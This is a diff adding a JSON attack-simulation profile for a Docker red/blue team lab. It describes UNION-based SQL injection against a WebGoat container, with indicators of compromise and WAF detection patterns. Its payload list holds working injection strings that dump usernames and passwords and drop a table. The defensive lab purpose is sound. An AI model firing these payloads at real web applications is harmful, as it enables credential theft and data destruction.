@@ -1,0 +1,52 @@
+{
+  "meta": {
+    "description": "Synthetic dummy attack pattern for cybersecurity simulation in Docker environments",
+    "version": "1.0.0",
+    "purpose": "Educational / Red-Blue Team Lab Simulation",
+    "generated": "2026-03-13",
+    "warning": "FOR SIMULATION USE ONLY — Do not use against real infrastructure"
+  },
+  "id": "ATK-005",
+  "name": "SQL Injection — UNION-Based Exfiltration",
+  "category": "Initial Access / Exfiltration",
+  "mitre_att_ck": "T1190",
+  "description": "Malicious SQL injected into web app parameters to extract database contents via UNION SELECT chains.",
+  "severity": "critical",
+  "docker_target": "victim-webapp:8080",
+  "simulation": {
+    "tool": "sqlmap / custom HTTP requests",
+    "pattern": "union_based_sqli",
+    "target_endpoint": "http://victim-webapp:8080/api/product?id=",
+    "payloads": [
+      "1 OR 1=1--",
+      "1 UNION SELECT NULL,NULL,NULL--",
+      "1 UNION SELECT username,password,email FROM users--",
+      "1 UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
+      "1; DROP TABLE logs--"
+    ],
+    "http_method": "GET",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (compatible; SynthScanner/1.0)",
+      "X-Forwarded-For": "127.0.0.1"
+    },
+    "exfiltrated_table": "users",
+    "exfiltrated_columns": ["username", "password_hash", "email", "role"],
+    "total_records_exfiltrated": 5000,
+    "requests_per_second": 10
+  },
+  "indicators_of_compromise": [
+    "SQL keywords in HTTP query parameters",
+    "Unusual response sizes for identical endpoints",
+    "High error rate followed by large data response",
+    "Requests with encoded quotes/dashes/semicolons"
+  ],
+  "detection_rules": {
+    "waf_sql_keyword_patterns": ["UNION", "SELECT", "DROP", "OR 1=1", "--", "xp_"],
+    "response_size_anomaly_factor": 5,
+    "action": "block_request_and_alert"
+  },
+  "docker_compose_hint": {
+    "victim-webapp": { "image": "webgoat/webgoat-8.0", "ports": ["8080:8080"] },
+    "attacker-node": { "image": "kalilinux/kali-rolling" }
+  }
+}
